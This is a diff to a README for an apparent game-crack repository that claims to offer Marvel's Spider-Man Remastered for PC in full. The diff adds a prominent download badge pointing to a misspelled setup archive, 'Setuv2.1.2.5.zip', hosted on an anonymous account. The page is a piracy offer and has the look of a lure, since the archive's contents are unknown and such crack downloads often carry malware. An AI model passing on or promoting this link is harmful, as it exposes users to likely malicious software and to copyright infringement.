@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/nick-x1994m1/marvels-spider-man-remastered-crack/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # marvels-spider-man-remastered-crack
 
 Marvel's-spider-man — Marvel's Spider-Man Remastered is on PC. This release contains the full game. Experience Peter Parker's story.
